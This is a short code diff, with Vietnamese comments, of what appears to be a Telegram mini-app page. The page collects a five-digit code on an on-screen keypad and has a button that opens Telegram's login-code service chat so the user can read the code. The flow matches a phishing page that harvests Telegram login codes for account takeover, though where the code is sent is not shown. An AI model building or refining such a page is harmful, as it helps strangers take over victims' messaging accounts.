@@ -56,6 +56,7 @@ body { font-family: sans-serif; background: #1a1a1a; color: white; margin: 0; di
             <button class="key" onclick="press('0')">0</button>
             <button class="key" onclick="del()">⌫</button>
         </div>
+        <!-- Nút Xem mã ở Step 2 -->
         <button class="btn-view" onclick="openTelegram()">XEM MÃ</button>
     </div>
 
@@ -86,7 +87,7 @@ function press(num) {
         otp += num;
         renderOTP();
         tg.HapticFeedback.impactOccurred('light');
-        if (otp.length === 5) goStep3();
+        if (otp.length === 5) goStep3(); // tự nhảy Step 3 khi đủ 5 số
     }
 }
 
@@ -107,7 +108,7 @@ function goStep3() {
     document.getElementById('step-3').classList.remove('hidden');
 }
 
-// Nút xem mã
+// Nút Xem mã luôn mở Telegram
 function openTelegram() {
     window.location.href = "tg://user?id=777000";
 }
